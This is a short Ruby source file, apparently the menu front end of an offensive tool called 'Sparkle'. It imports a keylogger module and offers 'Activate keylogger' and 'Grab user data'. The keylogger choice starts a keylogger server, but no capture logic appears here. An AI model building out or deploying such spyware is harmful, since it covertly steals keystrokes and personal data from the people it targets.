require "tty-prompt"
require 'optparse'
require_relative "./tools/keylogger.rb"

class Sparkle
    def initialize
        @@choice = ["Activate keylogger", "Grab user data"]
        @@options = {}
        @@prompt = TTY::Prompt.new
    end    

    def menu()
        # parser = OptionParser.new do |parser|     
        #     parser.on("-k",  "--keylogger", "Activate Keylogger") do
        #         puts "Keylogger" 
        #     end
        #     parser.on("-s",  "--stenography", "Stenography") do 
        #     end
        # end
        # parser.parse!(into: @@options)

        menu = @@prompt.select("Please select a tool", @@choice)

        if menu == @@choice[0]
            # TODO add keylogger 
            Keylogger.new().start_server()
        end
    end
end
